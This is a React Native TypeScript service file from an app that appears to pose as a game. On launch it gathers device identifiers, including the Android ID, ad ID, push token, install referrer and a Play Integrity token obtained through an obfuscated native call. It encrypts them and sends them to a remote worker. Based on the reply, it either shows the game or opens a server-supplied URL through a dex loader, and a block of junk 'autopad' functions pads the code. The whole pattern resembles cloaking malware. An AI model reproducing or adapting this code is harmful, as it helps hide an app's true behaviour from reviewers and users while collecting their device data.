/* @app-slot:service */
import { Utils, SendInitPayload, NormalizeWorkerBaseUrl } from './UtilService';
import { EncryptB64u as cryptoEncryptB64u, DecryptB64u as cryptoDecryptB64u } from './CryptoService';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { finKey } from './nativeConstants';
import { deleteToken, getMessaging } from '@react-native-firebase/messaging';
import { Dimensions, NativeModules, Platform } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import { InitializationState, InitTarget, AppenndSendId, GetAndroidId, GetAndroidUserAAgent, GetAppIdenier, GetAppVersion, InitializationRuntime } from './initializationShared';
import { openWithDex } from './dexLoader';
import { AssembleIntake, MapInitResponse } from './CfProtocol';

async function RequestPlayIntegrityToken(): Promise<string> {

  if (Platform.OS !== 'android') {
    return '';
  }
  try {
    const boguvuhacihulo = NativeModules.Eqitegele?.boguvuhacihulo;
    if (typeof boguvuhacihulo !== 'function') {
      return '';
    }
    const token = await boguvuhacihulo();
    return typeof token === 'string' ? token : '';
  } catch {
    return '';
  }
}

export async function InitStep(): Promise<InitializationState | null> {

  try {
    const primaryWorkerUrl = await Utils.GetLink();
        if (!primaryWorkerUrl || primaryWorkerUrl === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    const [appId, userAgent, androidId, appVersion, playIntegrityToken] =
      await Promise.all([
        GetAppIdenier(),
        GetAndroidUserAAgent(),
        GetAndroidId(),
        GetAppVersion(),
        RequestPlayIntegrityToken(),
      ]);
    const workerBaseUrl = NormalizeWorkerBaseUrl(primaryWorkerUrl);

    const payloadDeviceId = InitializationRuntime.DeviceId;

    const namingValue = InitializationRuntime.FinlNaming;

    const CookieFields = ([
      appId ?? '',
      payloadDeviceId ?? '',
      InitializationRuntime.adId ?? '',
      InitializationRuntime.pushToken ?? '',
      InitializationRuntime.installRef ?? '',
      InitializationRuntime.FinlOneLink ?? '',
      namingValue ?? '',
      userAgent ?? '',
      appVersion ?? '',
      androidId ?? '',
    ]);

    const { width, height } = Dimensions.get('window');
    let manufacturer = '';
    let deviceModel = '';
    try {
      manufacturer = DeviceInfo.getManufacturerSync?.() ?? '';
      deviceModel = DeviceInfo.getModel?.() ?? '';
    } catch {
      manufacturer = '';
      deviceModel = '';
    }

    let locale = '';
    let timezone = '';
    try {
      locale = Intl.DateTimeFormat().resolvedOptions().locale || '';
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
    } catch {
      locale = '';
      timezone = '';
    }

    const cryptoApi = (globalThis as { crypto?: { randomUUID?: () => string } }).crypto;
    const sessionId =
      cryptoApi?.randomUUID?.() ??
      `${Date.now()}-${Math.random().toString(16).slice(2)}`;

    const bodyPlain =
      `event=app_start` +
      `&device_model=${deviceModel}` +
      `&manufacturer=${manufacturer}` +
      `&locale=${locale}` +
      `&timezone=${timezone}` +
      `&network=unknown` +
      `&screen=${Math.round(width)}x${Math.round(height)}` +
      `&session_id=${sessionId}` +
      `&play_integrity_token=${encodeURIComponent(playIntegrityToken)}`;

    // v2: AssembleIntake returns {cookie,header,body} as b64url of PLAINTEXT CBOR bytes.
    const packed = JSON.parse(await AssembleIntake(CookieFields, bodyPlain)) as { cookie?: string; header?: string; body?: string };
    const encryptedCookie = cryptoEncryptB64u(packed.cookie || '');
    const dataValue = encodeURIComponent(encryptedCookie);
    const headerValue = encodeURIComponent(cryptoEncryptB64u(packed.header || ''));
    // cookieHeader is unused by native (tasutamefez prepends COOKIE_NAME itself).
    // encryptedBody is just the b64url wire — native prepends `<BODY_FIELD>=` from
    // its own per-project constant so JS stays wire-agnostic.
    const cookieHeader = dataValue;
    const encryptedBody = encodeURIComponent(cryptoEncryptB64u(packed.body || ''));

    try {
      const responseText = await SendInitPayload(workerBaseUrl, {
        cookieHeader,
        dataValue,
        headerValue,
        body: encryptedBody,
      });

      if (!responseText) {
        await Utils.SetUserBlocke(1);
        await UnsubscribeFirebase('init step: empty worker response');
        return {
          isLoadPlaceholder: true,
        };
      }

      return await OnInitResponse(responseText, workerBaseUrl);
    } catch (rpcError) {

      await UnsubscribeFirebase('init step: worker RPC failed');
      return {
        isLoadPlaceholder: true,
      };
    }
  } catch (error) {

    await UnsubscribeFirebase('init step: unexpected error');
    return {
      isLoadPlaceholder: true,
    };
  }
}

async function OnInitResponse(responseText: string, workerBaseUrl: string): Promise<InitializationState> {

  try {
    // v2: wire is b64url of AES(CBOR(map)). Decrypt → b64url of plaintext bytes,
    // then native CBOR-decodes and maps numeric response codes.
    const decrytedResponse = cryptoDecryptB64u(responseText);
    if (!decrytedResponse || decrytedResponse === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    let redirectUrl: string | null = null;
    let redirectUrlInitial: string | null = null;
    let errorField: string | null = null;
    let blockUser = false;

    try {
      const obj = await MapInitResponse(decrytedResponse);
      redirectUrl = obj.redirectUrl;
      redirectUrlInitial = obj.redirectUrlInitial;
      errorField = obj.error;
      blockUser = !!obj.blockUser;
          } catch (parseError) {

      return {
        isLoadPlaceholder: true,
      };
    }

    if (errorField || blockUser) {
      await Utils.SetUserBlocke(1);
      await UnsubscribeFirebase(
        errorField ? `init response: error ${errorField}` : 'init response: blockUser',
      );

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrl && !redirectUrlInitial) {
      await Utils.SetUserBlocke(1);
      await UnsubscribeFirebase('init response: user blocked (redirectUrl only)');

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrlInitial) {
      await AsyncStorage.setItem(finKey, redirectUrlInitial);

      const finalUrl = AppenndSendId(
        redirectUrlInitial,
        InitializationRuntime.pendingSendId,
      );

      const opened = await openWithDex(workerBaseUrl, finalUrl);
      if (!opened) {
        return {
          isLoadPlaceholder: true,
          initTarget: InitTarget.game,
        };
      }

      return {
        isLoadPlaceholder: false,
        initTarget: InitTarget.webview,
      };
    }

    await UnsubscribeFirebase('init response: no redirect URL, launching game');

    return {
      isLoadPlaceholder: true,
      initTarget: InitTarget.game,
    };
  } catch (error) {

    await UnsubscribeFirebase('init response: onSuccess error');

    return {
      isLoadPlaceholder: true,
    };
  }
}

export async function UnsubscribeFirebase(reason?: string): Promise<void> {

  try {
    const messaging = getMessaging();
    await deleteToken(messaging);
    InitializationRuntime.pushToken = '';
  } catch (error) {

    InitializationRuntime.pushToken = '';
  }
}

/* autopad-begin */
function ijinibino(_atojawapadaq: boolean, _ufibik: number, _kijopakeso: boolean): void {}
function evoyuv(_zeqocecevi: string, _ixufereyora: string): number {
  const onodel: number = 39;
  return onodel;
}
function ojefuqog(_kamumeva: number, _aficuferiqa: boolean): string {
  const lumoxurayaqi = 26;
  const erutifusogaf: string = "nes";
  return erutifusogaf;
}
function ebakefuko(_ligeqoqen: string): string { return "ipara"; }
function ivelagey(_erabukola: boolean, _masowaqo: number): void {
  const qakenir: number = 189;
}
function ukilowexula(): void {
  const wadusubotoy = 75;
  if (wadusubotoy > 49) return;
}
function judirep(): number {
  let vufenixudomi: number = 203;
  vufenixudomi = 116;
  return vufenixudomi;
}
function faqojeqay(_vowicinuliga: boolean, _awalezuf: boolean): number {
  const ubupifevusal = 30;
  const akiriwatol: number = 118;
  return akiriwatol;
}
function orobavaqeve(_umutuduca: boolean, _ucidave: string): string {
  let akukulicakac: string = "gevifad";
  akukulicakac = "gifi";
  return akukulicakac;
}
function ebadoy(_nujenaqowu: string, _ugosidu: boolean): boolean {
  return false;
}
function akogod(_bibubuj: boolean, _vuvevapugu: number, _jiparutida: number): boolean { return false; }
function kexipol(_nasujomafo: boolean): string {
  const owibimo: string = "toj";
  return owibimo;
}
function adozikopozo(): boolean {
  const aduvunatix = 13;
  return aduvunatix > 40 ? true : false;
}
function lolebufiv(_kiyomu: boolean): void {
  const naticuv: number = 149;
}
function luzicas(_otixim: string): number { return 49; }
function uvuceqakawik(_obexiseviyo: string, _befazuloy: string): boolean {
  const odumonefida: boolean = true;
  return odumonefida;
}
/* autopad-end */
